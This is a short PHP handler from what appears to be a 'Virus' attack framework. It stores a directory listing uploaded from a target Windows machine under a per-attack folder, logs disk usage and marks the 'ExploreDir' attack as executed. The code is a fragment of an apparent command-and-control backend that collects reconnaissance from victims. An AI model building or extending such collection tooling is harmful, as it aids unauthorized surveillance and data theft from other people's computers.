<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir $this */

$fileName = DATA_FILE . "/attacks/" . $this->getAttackId() . "/dirs.txt";
$this->requestData->moveFile("dirsFile", $fileName);
$this->usage()->setDisk(filesize($fileName));
$this->usage()->saveState();
$this->setExecuted();
